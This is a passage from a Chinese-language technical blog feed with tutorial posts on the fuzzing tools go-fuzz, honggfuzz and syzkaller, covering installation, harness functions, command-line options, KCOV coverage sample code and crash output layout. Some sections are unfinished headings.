shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">dlv test -- -run=FuzzReverse/058293736f23eabc<br></code></pre></td></tr></table></figure><p>模糊测试参数：</p><ul><li><code>-fuzz</code>: 指定要运行的模糊测试函数名</li><li><code>-fuzztime</code>: 设置运行持续时间（如 “10s”、”1h”）</li><li><code>-fuzzminimizetime</code>: 最小化崩溃用例的时间（默认60秒）</li><li><code>-parallel</code>: 并行运行的模糊测试数量</li></ul><ol><li>目前仅支持 <code>[]byte</code> 和 <code>string</code> 作为模糊测试输入类型</li><li>相比go-fuzz缺少一些高级功能（如自定义变异策略）</li><li>性能可能不如编译为二进制的go-fuzz</li></ol><h2 id="go-fuzz"><a href="#go-fuzz" class="headerlink" title="go-fuzz"></a>go-fuzz</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul><li>安装工具</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> install github.com/dvyukov/<span class="hljs-keyword">go</span>-fuzz/<span class="hljs-keyword">go</span>-fuzz@latest github.com/dvyukov/<span class="hljs-keyword">go</span>-fuzz/<span class="hljs-keyword">go</span>-fuzz-build@latest<br></code></pre></td></tr></table></figure><h3 id="基础实例"><a href="#基础实例" class="headerlink" title="基础实例"></a>基础实例</h3><p>我们使用 go-fuzz 首先需要编写以下形式的测试函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fuzz</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> <span class="hljs-type">int</span><br></code></pre></td></tr></table></figure><p>参数：字节切片</p><p>返回值说明：</p><ul><li><code>1</code>表示应优先考虑类似输入。</li><li><code>0</code>表示中性。</li><li><code>-1</code>表示从语料库中排除。</li></ul><p>官方文档的示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//测试PNG包</span><br><span class="hljs-keyword">package</span> png<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;bytes&quot;</span><br><span class="hljs-string">&quot;image/png&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fuzz</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>img, err := png.Decode(bytes.NewReader(data))<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> img != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;解码出错但img不为nil&quot;</span>)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>&#125;<br><br><span class="hljs-keyword">var</span> w bytes.Buffer<br>err = png.Encode(&amp;w, img)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-built_in">panic</span>(err)<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>构建测试程序</li></ul><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">go</span>-fuzz-build -o <span class="hljs-built_in">image</span>-fuzz.zip<br></code></pre></td></tr></table></figure><ul><li>构建语料库</li></ul><p>构建一个供 go-fuzz 使用的语料库，语料库存放在工作目录下。</p><blockquote><p>语料库：<a href="https://github.com/dvyukov/go-fuzz-corpus">dvyukov&#x2F;go-fuzz-corpus：github.com&#x2F;dvyukov&#x2F;go-fuzz 示例的语料库</a></p></blockquote><ul><li>开始Fuzz</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">go-fuzz <span class="hljs-attribute">-bin</span>=image-fuzz.zip <span class="hljs-attribute">-workdir</span>=.<br></code></pre></td></tr></table></figure><ul><li>workers 表示并行运行的测试数（使用 -procs 标志设置）。</li><li>corpus 是模糊测试程序发现的有趣输入的当前数量，括号中的时间表示发现最后一个有趣输入的时间</li><li>crashers 是发现的 bug 的数量（查看 workdir&#x2F;crashers 目录）。</li><li>restarts 是模糊测试程序重新启动测试进程的速率。</li><li>cover 是在经过哈希处理的覆盖率位图中设置的位数</li></ul><p>.quoted 文件包含以字符串形式引用的输入，.output 文件包含故障转储</p><p>go-fuzz初步支持Go Modules，会遵循<code>GO111MODULE</code>环境变量设置：</p><ul><li><code>on</code>：启用模块</li><li><code>off</code>：禁用模块</li><li><code>auto</code>：自动判断</li></ul><h3 id="libFuzzer-集成"><a href="#libFuzzer-集成" class="headerlink" title="libFuzzer 集成"></a>libFuzzer 集成</h3><p>在 Linux  系统上，go-fuzz可以生成与 libFuzzer 兼容的存档文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">go-fuzz-build -libfuzzer  # 生成.a文件<br>clang -fsanitize=fuzzer fmt.a -o fmt.libfuzzer<br>./fmt.libfuzzer<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">构建libfuzzer目标</span><br>go-fuzz-build -libfuzzer -o fuzz.a .<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">使用clang编译</span><br>clang -fsanitize=fuzzer fuzz.a -o fuzz_binary<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">运行模糊测试</span><br>mkdir -p corpus<br>./fuzz_binary corpus<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">或者最小化复现崩溃</span><br>./fuzz_binary -minimize_crash=1 -runs=100 crash_input<br></code></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里我们使用 go-fuzz 来进行 CVE 漏洞的复现。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span>-fuzz-build github.<span class="hljs-keyword">com</span>/JoshVarga/svgparser<br></code></pre></td></tr></table></figure><p>编写 Fuzz 函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> go_mp4_fuzz<br><br><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;github.com/Eyevinn/mp4ff/mp4&quot;</span><br>    <span class="hljs-string">&quot;bytes&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fuzz</span><span class="hljs-params">(data []<span class="hljs-type">byte</span>)</span></span> <span class="hljs-type">int</span> &#123;<br>    r := bytes.NewReader(data)<br>    _, err := mp4.DecodeFile(r)<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>&#125;<br></code></pre></td></tr></table></figure><p>构建 Fuzz 程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go-fuzz-build -o mp4fuzz.zip<br></code></pre></td></tr></table></figure><p>启动 go-fuzz</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">go-fuzz -bin=mp4fuzz.zip -workdir=corpus<br></code></pre></td></tr></table></figure><ul><li>workers 表示并行运行的测试数（使用 -procs 标志设置）。</li><li>corpus 是模糊测试程序发现的有趣输入的当前数量，括号中的时间表示发现最后一个有趣输入的时间</li><li>crashers 是发现的 bug 的数量（查看 workdir&#x2F;crashers 目录）。</li><li>restarts 是模糊测试程序重新启动测试进程的速率。</li><li>cover 是在经过哈希处理的覆盖率位图中设置的位数</li></ul><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://github.com/dvyukov/go-fuzz">dvyukov&#x2F;go-fuzz：Go 的随机测试</a><br><a href="https://snoopysecurity.github.io/posts/fuzzing-wit-go-fuzz/">使用 Go-Fuzz 进行模糊测试 |💻 |博客</a><br><a href="https://go.dev/doc/tutorial/fuzz">教程：模糊测试入门 - Go 编程语言</a><br><a href="https://parsiya.net/blog/2018-05-05-learning-go-fuzz-2-goexif2/">Learning Go-Fuzz 2: goexif2</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Honggfuzz浅探</title>
      <link href="/2025/07/01/fuzz/honggfuzz/"/>
      <url>/2025/07/01/fuzz/honggfuzz/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Honggfuzz 是一款高性能、基于覆盖引导（Coverage-guided）的模糊测试工具，由 Google 安全工程师开发，广泛应用于挖掘软件中的内存破坏、逻辑漏洞等安全问题。</p><p>工作原理</p><ul><li>覆盖引导：监控目标程序的代码覆盖率（通过插桩或硬件PT），优先保留触发新路径的输入。</li><li>输入变异：基于遗传算法，对初始种子文件进行位翻转、块替换等变异。</li><li>异常检测：捕获崩溃（如SIGSEGV）、超时或用户定义的异常行为。</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="依赖安装"><a href="#依赖安装" class="headerlink" title="依赖安装"></a>依赖安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt update<br>sudo apt install -y build-essential git clang pkg-config \<br>libunwind-dev libblocksruntime-dev liblzma-dev \<br>    libncurses5-dev libtinfo-dev libcapstone-dev<br></code></pre></td></tr></table></figure><h3 id="编译目标程序"><a href="#编译目标程序" class="headerlink" title="编译目标程序"></a>编译目标程序</h3><ul><li>使用Sanitizers：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">clang -fsanitize=address,undefined -fno-omit-frame-pointer -g -o target target.c<br></code></pre></td></tr></table></figure><ul><li>硬件PT模式（需Intel CPU）：</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz -e pt -- ./target ___FILE___<br></code></pre></td></tr></table></figure><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="文件输入模式"><a href="#文件输入模式" class="headerlink" title="文件输入模式"></a>文件输入模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">honggfuzz -i <span class="hljs-keyword">in</span> -o out -- ./target ___FILE___<br></code></pre></td></tr></table></figure><ul><li><code>-i</code>：初始种子目录。  </li><li><code>-o</code>：崩溃和日志输出目录。  </li><li><code>___FILE___</code>：占位符，表示输入文件路径。这里的下划线是3个。</li></ul><h3 id="标准输入模式"><a href="#标准输入模式" class="headerlink" title="标准输入模式"></a>标准输入模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">honggfuzz --stdin_input -- ./target &lt; ___FILE___<br></code></pre></td></tr></table></figure><h3 id="网络服务Fuzz"><a href="#网络服务Fuzz" class="headerlink" title="网络服务Fuzz"></a>网络服务Fuzz</h3><p>需包装目标程序，将输入通过Socket传递：</p><ul><li>包装程序</li></ul><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><ul><li>Fuzz</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz -- ./network_wrapper ___FILE___<br></code></pre></td></tr></table></figure><h2 id="高级功能"><a href="#高级功能" class="headerlink" title="高级功能"></a>高级功能</h2><h3 id="Linux-perf"><a href="#Linux-perf" class="headerlink" title="Linux perf"></a>Linux perf</h3><p>使用 Linux 来提高 coverage 精度</p><h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><p>通过<code>-n</code>参数启动多个并发 fuzzer 实例。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz -i in -o out -n 4 -- ./target ___FILE___<br></code></pre></td></tr></table></figure><h3 id="字典支持"><a href="#字典支持" class="headerlink" title="字典支持"></a>字典支持</h3><p>通过<code>-x</code>参数使用字典进行 Fuzz。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz -i in -o out -x dict.txt -- ./target ___FILE___<br></code></pre></td></tr></table></figure><h3 id="闭源"><a href="#闭源" class="headerlink" title="闭源"></a>闭源</h3><p>通过<code>--qemu-mode</code>进行黑盒模糊测试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz -i in -o out --qemu-mode -- ./target __FILE__<br></code></pre></td></tr></table></figure><h3 id="自定义变异策略"><a href="#自定义变异策略" class="headerlink" title="自定义变异策略"></a>自定义变异策略</h3><p>通过 <code>--mutate_cmd</code> 调用外部脚本：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz --mutate_cmd ./custom_mutator.py -- ./target ___FILE___<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz --mutations_per_round=100 -- ./target ___FILE___<br></code></pre></td></tr></table></figure><h3 id="持久化模式"><a href="#持久化模式" class="headerlink" title="持久化模式"></a>持久化模式</h3><p>避免进程重启开销（适用于初始化复杂的程序）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 目标代码中调用HF_ITER()</span><br><span class="hljs-keyword">while</span> (__HF_ITER(&amp;buf, &amp;len)) &#123;<br>    process_input(buf, len);<br>&#125;<br></code></pre></td></tr></table></figure><p>编译后运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">honggfuzz --persistent -- ./target_persistent<br></code></pre></td></tr></table></figure><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>复现 xpdf 中存在的一个堆溢出漏洞。</p><h3 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h3><h3 id="开始Fuzz"><a href="#开始Fuzz" class="headerlink" title="开始Fuzz"></a>开始Fuzz</h3><h3 id="分析Crash"><a href="#分析Crash" class="headerlink" title="分析Crash"></a>分析Crash</h3><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://github.com/google/honggfuzz/wiki">GitHub Wiki</a><br><a href="https://bbs.kanxue.com/thread-247954.htm">[原创] honggfuzz漏洞挖掘技术深究系列-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Fuzz </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fuzzer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>syzkaller初探</title>
      <link href="/2025/07/01/fuzz/syzkaller/"/>
      <url>/2025/07/01/fuzz/syzkaller/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Syzkaller 是 Google 的安全研究人员开发并维护的开源内核 Fuzz 工具，目前主要由 <a href="https://github.com/dvyukov">dvyukov</a> 维护。它是使用 Go 语言编写的，也有少部分 C 代码，具有部署快速、使用简便的特点，同时还支持多种操作系统如：Linux、Android、Windows、openbsd、darwin 等系统。不过它支持最全面的还是 Linux 系统，对其它系统的支持都不同程度差一点。</p><p>有研究人员做过移植syzkaller fuzz windows WSL[2]和Darwin&#x2F;XNU[1][5]的尝试，也都取得了较好的成果。可以说，syzkaller是当今宇宙最强大的内核fuzz工具了。我们将从整体架构开始，介绍syzkaller一些实现的细节。目前在github上syzkaller除了master分支之外还有一个long-line分支和usb-fuzzer分支，usb-fuzzer分支是xairy用来挖掘USB驱动漏洞的一个分支，在OffensiveCon2019上讲过[7]。</p><p>我们本文的学习就是以 fuzzing Linux 为主。</p><p>什么是覆盖引导（<strong>coverage-guided</strong>）？</p><ul><li><p>覆盖引导，即<strong>通过向目标程序插桩，统计代码覆盖，反馈给模糊测试引擎（fuzzer，即模糊测试工具），反馈信息用于变异种子，生成更高质量的输入，使得 fuzzer 能够用更好的输入让被测程序达到更高的代码覆盖率。</strong></p></li><li><p>对于每个目标，fuzzer 都会构建一个输入的语料库，随着 fuzzer 通过变异语料库发现新的输入，覆盖率会不断增长。常见的模糊测试引擎（fuzzer，即模糊测试工具）有 afl、honggfuzz、libfuzzer 以及本次所说的 syzkaller，这些都是经典的 fuzzing 工具。</p></li></ul><p>之前提到过 <a href="https://github.com/google/syzkaller">syzkaller</a>，它可以说是目前最广泛使用的 OS fuzzer。它不仅提供了简单的部署流程，只需要几个命令，还允许用户自定义执行环境，像是可以设置允许的 syscall、VM 实例数、自定义 syscall 以及调用依赖等。而且它有清晰的用户界面，让用户能够看到当前执行的状态，包括发生崩溃的位置和错误报告、当前尚未执行的 seed，甚至可以查看源代码中各个 basic block 的执行次数。</p><p>如果你对用户界面提供的功能感兴趣，这里提供了一个外部开设的 <a href="https://elisa-builder-00.iol.unh.edu/syzkaller/">syzkaller server</a> 供你参考。同时，syzkaller 也有官方维护，并不断对最新版本的内核进行 fuzzing 的 <a href="https://syzkaller.appspot.com/">syzbot</a>，研究人员可以通过分析 syzbot 所报告的漏洞，了解某个操作系统中常见的漏洞发生区域。</p><p>下面是 syzkaller 的架构图，主要分为三个组件，分别是 <strong>syz-manager</strong>、<strong>syz-fuzzer</strong> 和 <strong>syz-executor</strong>：</p><p><img src="/Linux/assets/Pasted%20image%2020250521160056.png"></p><ul><li><strong>syz-manager</strong> - 运行在 host 上，主要用于管理 VM 实例和用户界面<ul><li>一开始会初始化整个环境，之后负责管理系统和输出结果，涉及 fuzzer 机制较少。</li></ul></li><li><strong>syz-executor</strong> - 执行 syscall sequence<ul><li>不断等待 syz-fuzzer 传来的 “program”，即一组 syscall 组合</li><li>不断重复执行这些程序</li></ul></li></ul><p>此外，syzkaller 还提供了许多可用的工具，比如复现崩溃输入或对输入做最小化等，但这些工具不一定会用到，所以没有列在架构图中。编译内核时所使用的 kernel config 只需要满足 syzkaller 所使用的功能，其他部分可以根据需要调整。</p><h3 id="KASAN"><a href="#KASAN" class="headerlink" title="KASAN"></a><strong>KASAN</strong></h3><h3 id="KCOV"><a href="#KCOV" class="headerlink" title="KCOV"></a>KCOV</h3><p>收集 coverage 的方式是 syzkaller 的一个重要特点，之前在 Day22 提到过 kAFL 时也稍微介绍过，syzkaller 使用 <code>KCOV</code> 来收集 coverage，而 <code>KCOV</code> 的开发人员之一就是 syzkaller 的维护者。这里将稍微介绍一下 <code>KCOV</code>，详细内容可以参考 <a href="https://docs.kernel.org/dev-tools/kcov.html">KCOV documentation</a>。</p><p>以下是使用 <code>KCOV</code> 的示例代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCOV_INIT_TRACE  _IOR(<span class="hljs-string">&#x27;c&#x27;</span>, 1, unsigned long)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCOV_ENABLE      _IO(<span class="hljs-string">&#x27;c&#x27;</span>, 100)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCOV_DISABLE     _IO(<span class="hljs-string">&#x27;c&#x27;</span>, 101)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COVER_SIZE       (64&lt;&lt;10) <span class="hljs-comment">// 0x10000</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCOV_TRACE_PC  0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCOV_TRACE_CMP 1</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span><br>&#123;<br>    <span class="hljs-comment">// 用来收集 coverage 的接口</span><br>    fd = open(<span class="hljs-string">&quot;/sys/kernel/debug/kcov&quot;</span>, O_RDWR);<br>    <span class="hljs-comment">// 初始化 trace 模式，设置 trace 大小</span><br>    ioctl(fd, KCOV_INIT_TRACE, COVER_SIZE);<br>    <span class="hljs-comment">// 创建一块内核和用户空间共享的内存</span><br>    cover = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)mmap(<span class="hljs-literal">NULL</span>, COVER_SIZE * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>),<br>                                 PROT_READ | PROT_WRITE, MAP_SHARED, fd, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 开启当前线程的 coverage 收集</span><br>    ioctl(fd, KCOV_ENABLE, KCOV_TRACE_PC);<br><br>    <span class="hljs-comment">// 重置 coverage</span><br>    __atomic_store_n(&amp;cover[<span class="hljs-number">0</span>], <span class="hljs-number">0</span>, __ATOMIC_RELAXED);<br>    <br>    <span class="hljs-comment">// 目标 syscall</span><br>    read(<span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>);<br>    <br>    <span class="hljs-comment">// 获取记录的地址数量</span><br>    n = __atomic_load_n(&amp;cover[<span class="hljs-number">0</span>], __ATOMIC_RELAXED);<br>    <span class="hljs-comment">// 遍历整个 buffer，打印访问的地址</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;0x%lx\n&quot;</span>, cover[i + <span class="hljs-number">1</span>]);<br><br>    <span class="hljs-comment">// 关闭当前线程的 coverage 收集</span><br>    ioctl(fd, KCOV_DISABLE, <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 释放资源</span><br>    munmap(cover, COVER_SIZE * <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)));<br>    close(fd);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>背后的原理是之前在 Day11 介绍的 <code>__sanitizer_cov_trace_pc()</code> 插桩，也就是每个 basic block 执行前都会调用一次，<code>KCOV</code> 所做的插桩内容如下，参考 Linux 内核的 <a href="https://elixir.bootlin.com/linux/latest/source/kernel/kcov.c#L192">kcov.c</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> notrace __sanitizer_cov_trace_pc(<span class="hljs-type">void</span>)<br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> ip = canonicalize_ip(_RET_IP_);<br><br>    t = current;<br>    <span class="hljs-keyword">if</span> (!check_kcov_mode(KCOV_MODE_TRACE_PC, t))<br>        <span class="hljs-keyword">return</span>;<br>    <br>    area = t-&gt;kcov_area;<br>    pos = READ_ONCE(area[<span class="hljs-number">0</span>]) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (likely(pos &lt; t-&gt;kcov_size)) &#123;<br>        WRITE_ONCE(area[<span class="hljs-number">0</span>], pos);<br>        barrier();<br>        area[pos] = ip;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>Syzkaller是一种Linux内核模糊测试工具，具有覆盖引导模糊测试的特点。以下是Syzkaller的基本工作流程及其组成部分的描述。</p><p>Syzkaller的过程结构如下图所示；红色标签指示相应的配置选项。</p><p>Syzkaller的进程结构：</p><p><strong>syz-manager</strong> 负责以下任务：</p><ul><li><p>启动&#x2F;重启&#x2F;监控虚拟机实例（VM）。</p></li><li><p>进行实际的模糊测试过程（输入生成、突变、最小化等）。</p></li><li><p>持久化语料库和崩溃报告存储。</p></li><li><p>它运行在主机上，主机有一个稳定的内核，不会受到白噪声模糊测试负载的影响。</p></li></ul><p><strong>syz-manager</strong> 启动进程（每个虚拟机一个）。这些进程通过RPC通信来接收必须执行的程序，并报告执行结果（错误状态、覆盖率等）。</p><p><strong>syz-executor</strong>：执行程序的进程，负责启动临时子进程。每个临时子进程执行一个单一的输入（即一系列的系统调用）。它被设计为尽可能简单，以避免干扰模糊测试过程，使用C++编写并编译为静态二进制文件，使用共享内存进行通信。</p><ul><li>系统调用描述</li></ul><p>进程基于这里描述的系统调用（syscall）生成程序。</p><ul><li>覆盖率</li></ul><p>Syzkaller是一个覆盖引导模糊测试工具，关于覆盖率收集的详细信息可以在此处找到。</p><ul><li>崩溃报告</li></ul><p>当Syzkaller发现崩溃时，它会将相关信息保存在一个目录中。该目录包含一个子目录，每种独特的崩溃类型对应一个子目录。每个子目录中包含一个文件，该文件包含一个唯一的字符串标识符，用于崩溃的标识和去重。该子目录还包含最多100个文件，每个文件包含一对用于测试机器崩溃的日志文件和报告文件。</p><p>例如：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">syzkaller_workdir</span>/crashes/<br>   ├── <span class="hljs-number">6e512290</span>efa36515a7a27e53623304d20d1c3e<br>   │   ├── description<br>   │   ├── log0<br>   │   ├── report0<br>   │   ├── log1<br>   │   ├── report1<br>   │   └── ...<br>   ├── <span class="hljs-number">77</span>c578906abe311d06227b9dc3bffa4c52676f<br>   │   ├── description<br>   │   ├── log0<br>   │   ├── report0<br>   │   └── ...<br></code></pre></td></tr></table></figure><p>描述信息通过一组正则表达式提取。这些表达式可能需要扩展，尤其是当使用不同的内核架构时，或者遇到之前未见过的内核错误信息时。</p><ul><li><p><strong>logN</strong> 